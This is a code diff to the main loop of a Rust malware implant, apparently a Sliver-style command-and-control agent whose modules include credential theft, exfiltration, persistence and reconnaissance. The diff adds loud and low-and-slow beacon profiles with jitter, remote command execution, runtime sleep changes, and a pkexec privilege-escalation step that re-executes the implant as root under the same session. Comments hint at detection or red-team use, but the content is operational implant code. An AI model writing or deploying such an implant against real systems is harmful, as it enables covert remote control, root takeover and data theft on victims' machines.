@@ -3,31 +3,50 @@ pub mod c2;
 pub mod copyfail;
 pub mod creds;
 pub mod dispatch;
+pub mod discovery;
 pub mod exfil;
 pub mod marker;
 pub mod payload;
 pub mod persist;
 pub mod recon;
 
-/// Continuous beacon loop — Sliver-style.
+/// Continuous beacon/interactive loop — Sliver-style.
 ///
-/// The implant stays alive and polls the C2 on the configured beacon interval.
-/// Each cycle: send beacon → receive & execute commands → sleep → repeat.
+/// The implant stays alive and polls the C2. Each cycle:
+///   send beacon → receive & execute commands → sleep → repeat.
 ///
-/// If the operator sends `exit`, the loop breaks and the process exits.
-/// If the operator sends `sleep <N>`, the beacon interval changes at runtime.
+/// Two operator-presence profiles (selected at implant generation time):
+///   - Interactive (loud): polls every ~1s, no jitter. The constant chatty
+///     check-ins are the intended "easy to detect" signal.
+///   - Beacon (low-and-slow): polls on beacon_interval with jitter.
+///
+/// Operator commands:
+///   - `system exit`  → loop breaks, process exits.
+///   - `system sleep N` → changes the poll interval at runtime (min 1s).
+///   - `privesc pkexec` (success) → this process re-execs as root under the
+///     SAME implant_id, then the unprivileged parent exits so only one root
+///     process beacons — the server upgrades the existing session rather than
+///     creating a second one.
 pub fn run_beacon_loop(config: &config::Config) {
     let implant_id = config.implant_id();
     let hostname = get_hostname();
-    let mut current_interval = config.beacon_interval;
+    let interactive = config.mode == config::ImplantMode::Interactive;
+    // Interactive: short fixed poll. Beacon: configured interval (+ jitter).
+    let mut current_interval = if interactive {
+        config::INTERACTIVE_POLL_SECS
+    } else {
+        config.beacon_interval
+    };
     let mut should_exit = false;
 
     loop {
-        // Jitter before each beacon
-        let jitter = config.jitter(config.beacon_jitter);
-        if jitter > 0 {
-            let ts = libc::timespec { tv_sec: jitter as _, tv_nsec: 0 };
-            unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
+        // Jitter before each beacon (beacon profile only — interactive is jitter-free)
+        if !interactive {
+            let jitter = config.jitter(config.beacon_jitter);
+            if jitter > 0 {
+                let ts = libc::timespec { tv_sec: jitter as _, tv_nsec: 0 };
+                unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
+            }
         }
 
         let os = config.get_os_info();
@@ -71,13 +90,24 @@ pub fn run_beacon_loop(config: &config::Config) {
                 };
                 let result = action.execute(config, &implant_id);
 
-                // Track beacon interval changes from sleep command
+                // Track beacon interval changes from sleep command.
+                // Floor of 1s: a 0 (or out-of-range) value is a no-op, never a
+                // hot-loop. (Restores the guard the working tree had removed.)
                 if cmd.module == "system" && cmd.action == "sleep" {
                     if let Some(secs) = result.data.get("slept_secs").and_then(|v| v.as_u64()) {
                         if secs > 0 && secs < 86400 {
                             current_interval = secs;
                         }
                     }
+                }
+
+                // A successful pkexec escalation re-execs us as root under the
+                // same implant_id; this unprivileged parent must exit so only
+                // the root process beacons (no confusing duplicate session).
+                if cmd.module == "privesc" && cmd.action == "pkexec"
+                    && result.data.get("reexec").and_then(|v| v.as_bool()).unwrap_or(false)
+                {
+                    should_exit = true;
                 }
 
                 // Send result immediately
@@ -95,8 +125,10 @@ pub fn run_beacon_loop(config: &config::Config) {
             break;
         }
 
-        // If stay_alive, poll faster temporarily (10s intervals, up to 5 min)
-        if response.stay_alive {
+        // stay_alive fast-poll only makes sense for the beacon profile:
+        // interactive already polls at ~1s, which is faster than the 10s
+        // fast-poll cadence.
+        if response.stay_alive && !interactive {
             let deadline = unsafe { libc::time(std::ptr::null_mut()) } + 300;
             while unsafe { libc::time(std::ptr::null_mut()) } < deadline && !should_exit {
                 let ts = libc::timespec { tv_sec: 10, tv_nsec: 0 };
@@ -127,6 +159,11 @@ pub fn run_beacon_loop(config: &config::Config) {
                     if cmd.module == "system" && cmd.action == "exit" {
                         should_exit = true;
                     }
+                    if cmd.module == "privesc" && cmd.action == "pkexec" {
+                        // Same-session escalation: parent exits after the root
+                        // re-exec is spawned. Stay-alive loop must honor it too.
+                        should_exit = true;
+                    }
                     let action = dispatch::CommandAction {
                         id: cmd.id.clone(),
                         module: cmd.module.clone(),
@@ -149,7 +186,7 @@ pub fn run_beacon_loop(config: &config::Config) {
             break;
         }
 
-        // Sleep for the beacon interval
+        // Sleep for the poll interval (1s interactive, beacon_interval otherwise)
         let ts = libc::timespec { tv_sec: current_interval as _, tv_nsec: 0 };
         unsafe { libc::nanosleep(&ts, std::ptr::null_mut()); }
     }
